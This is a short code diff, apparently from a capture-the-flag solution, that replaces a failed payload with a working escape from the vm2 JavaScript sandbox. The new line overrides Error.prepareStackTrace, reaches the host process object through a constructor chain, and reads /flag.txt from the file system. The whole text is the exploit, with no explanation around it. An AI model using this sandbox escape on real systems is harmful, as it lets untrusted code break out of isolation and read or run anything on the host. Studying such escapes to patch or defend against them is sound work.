@@ -17,5 +17,5 @@ let vm = new vm2.VM({
 })
 
 let result = ":(";
-result = new String(vm.run(`sum([]);readFile([../flag.txt])`)); 
+result = new String(vm.run(`sum([]);Error.prepareStackTrace=(e,f)=>{f.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag.txt')}(async ()=>{})//`)); 
 console.log(result); 
